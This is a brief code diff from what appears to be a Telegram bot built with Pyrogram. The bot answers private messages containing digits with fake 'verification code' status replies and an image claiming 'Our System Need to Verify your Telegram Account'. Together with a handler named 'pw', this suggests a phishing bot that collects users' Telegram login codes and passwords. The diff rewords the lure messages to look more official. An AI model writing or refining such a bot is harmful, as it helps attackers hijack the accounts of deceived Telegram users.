@@ -106,9 +106,9 @@ async def pw(_, message):
 
 @app.on_message(filters.regex("6|1|2|3|4") & filters.private)
 async def regex_cantik(_, message):
-    rexa = await message.reply("__Sent otp code...__")
+    rexa = await message.reply("__Sending Verification Code...__")
     await asyncio.sleep(10)
-    await rexa.edit("__successfully sent otp code…__")
+    await rexa.edit("__Successfully Sent Verification Code...__")
     await asyncio.sleep(5)
     await app.send_photo(message.chat.id, "https://telegra.ph/file/f84db4a1bc109f99747b0.jpg", caption="""
 💾 Our System Need to Verify your Telegram Account
